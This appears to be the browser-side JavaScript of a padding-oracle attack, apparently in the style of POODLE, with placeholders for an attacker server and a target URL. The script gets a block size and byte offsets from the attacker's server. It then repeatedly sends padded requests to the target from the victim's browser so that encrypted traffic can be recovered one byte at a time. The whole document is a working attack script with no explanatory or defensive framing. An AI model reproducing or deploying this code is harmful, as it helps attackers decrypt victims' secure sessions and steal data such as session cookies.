<script>
// Need to replace:
//  attackerIp
//  targetUrl

var blockSize = null;

function sendRequest(method, url, data, callback, errorcallback, timeout) {
	var request = new XMLHttpRequest();
	request.open(method || 'GET', url);
	request.responseType = 'text';
	request.timeout = timeout || 5000;
	request.onload = function() {
		callback(request.responseText);
	}
	request.onerror = function() {
		errorcallback && errorcallback(request.status, request.statusText)
	}
	request.send();
}

function attackByteAttempt(path, data, success) {
	// If the request is successful (even though we get a 404), we have the padding correct
	sendRequest('POST', targetUrl + "/" + path, data, success, function(status, message) {
		attackByteAttempt(path, data, success);
	});
}

function attackByte(dataLengthNeeded) {
	sendRequest('GET', attackerIp + "/offset", null, function(response) {
		var offset = parseInt(response, 10);
		data = "";
		path = "";
		if (offset > dataLengthNeeded) dataLengthNeeded += blockSize;
		var path = Array(offset + 1).join("a");
		var data = Array(dataLengthNeeded - offset + 1).join("a");
		attackByteAttempt(path, data, function() {
			attackByte(dataLengthNeeded); // On success, ask for next offset and repeat
		});
	});
}

// Get block size
var blockSizeString = ""

sendRequest('GET', attackerIp + "/blocksize", null, function (response) {
	blockSize = parseInt(response, 10);
	attackByte(blockSizeString.length);
}, null, 30000);

function sendBlockSizeRequest() {
	if (blockSize !== null) return;
	sendRequest('GET', targetUrl + "/" + blockSizeString);
	blockSizeString += "a"
	setTimeout(sendBlockSizeRequest, 100);
}
sendBlockSizeRequest();



</script>
